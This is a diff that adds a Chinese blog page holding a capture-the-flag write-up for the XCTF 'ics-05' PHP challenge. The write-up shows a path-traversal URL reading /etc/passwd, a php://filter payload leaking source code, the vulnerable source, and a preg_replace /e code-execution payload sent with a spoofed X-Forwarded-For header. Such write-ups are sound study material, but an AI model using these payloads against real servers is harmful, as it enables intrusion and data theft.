@@ -1,0 +1,218 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>20200924-PHP-XCTF-ics-05 - sakuradied</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="20200924-PHP-XCTF-ics-05文件包涵先检查页面找到了一个文件包涵点http://220.249.52.133:51253/index.php?page=../../../../.,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="sakuradied" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">sakuradied</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="https://sakuradied.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">20200924-PHP-XCTF-ics-05</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">20200924-PHP-XCTF-ics-05</h1>
+        <div class="stuff">
+            <span>九月 24, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="20200924-PHP-XCTF-ics-05文件包涵"><a href="#20200924-PHP-XCTF-ics-05文件包涵" class="headerlink" title="20200924-PHP-XCTF-ics-05文件包涵"></a>20200924-PHP-XCTF-ics-05文件包涵</h1><p>先检查页面找到了一个文件包涵点<br><a target="_blank" rel="noopener" href="http://220.249.52.133:51253/index.php?page=../../../../../../../etc/passwd">http://220.249.52.133:51253/index.php?page=../../../../../../../etc/passwd</a><br><img src="https://i.loli.net/2020/09/24/MiC4THhoRlzw2OS.png" alt="image.png"></p>
+<p>尝试了使用伪协议data无效<br>使用了 <code>?page=php://filter/read=convert.base64-encode/resource=index.php</code>读取到了源代码</p>
+<p><img src="https://i.loli.net/2020/09/24/ujRl7W9mgkTirA8.png" alt="image.png"></p>
+<p><strong>index.php(代码太长只取较为关键部分):</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$page = $_GET[page];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($page)) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctype_alnum($page)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">        &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">            &lt;p class=&quot;lead&quot;&gt;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//strpos()函数是区分大小写的</span></span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (strpos($page, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ($page === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="keyword">include</span>($page);</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                 <span class="comment">//尝试了半天使用data无果,寻找其他点</span></span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//检查xff头是否为 127.0.0.1</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">        <span class="comment">//preg_replace使用/e修饰符号可构建rec</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>preg_replace // 这个题的关键是利用文件包涵加伪协议读取index.php源代码,然后就是这个函数的利用</p>
+<p>payload:<code>?pat=/123/e&amp;rep=highlight_file(&#39;s3chahahaDir/flag/flag.php&#39;)&amp;sub=123</code></p>
+<p>利用远程命令执行查看目录内容并读取flag(需要修改xff头)<br><img src="https://i.loli.net/2020/09/24/YQmANxKBe75X9sJ.png" alt="image.png"></p>
+<p>参考资料:</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-preg_replace.html">https://www.runoob.com/php/php-preg_replace.html</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.xinyueseo.com/websecurity/158.html">http://www.xinyueseo.com/websecurity/158.html</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='/i'></li>
+                        
+                    
+                        
+                            <li title='2' data-url='/n'></li>
+                        
+                    
+                        
+                            <li title='3' data-url='/d'></li>
+                        
+                    
+                        
+                            <li title='4' data-url='/e'></li>
+                        
+                    
+                        
+                            <li title='5' data-url='/x'></li>
+                        
+                    
+                        
+                            <li title='6' data-url='/.'></li>
+                        
+                    
+                        
+                            <li title='7' data-url='/m'></li>
+                        
+                    
+                        
+                            <li title='8' data-url='/p'></li>
+                        
+                    
+                        
+                            <li title='9' data-url='/3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
